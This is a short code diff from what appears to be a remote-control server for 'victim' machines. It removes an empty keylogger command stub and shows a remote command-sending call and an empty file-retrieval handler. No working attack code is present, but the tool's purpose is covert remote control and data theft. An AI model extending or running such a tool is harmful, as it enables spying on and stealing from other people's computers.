@@ -289,12 +289,6 @@ int serverMode(const Properties &p) {
             RemoteCodeExecuter::sendCommand(&netEngine, daddr, line.substr(line.find(tokens[2])));
         }
 
-        // format: keylog [ip]
-        // Delete if not necessary
-        if (tokens[0] == "keylog") {
-            // Tell the victim machine to start the keylogger
-        }
-
         // format: get [ip] [file]
         if (tokens[0] == "get") {
         }
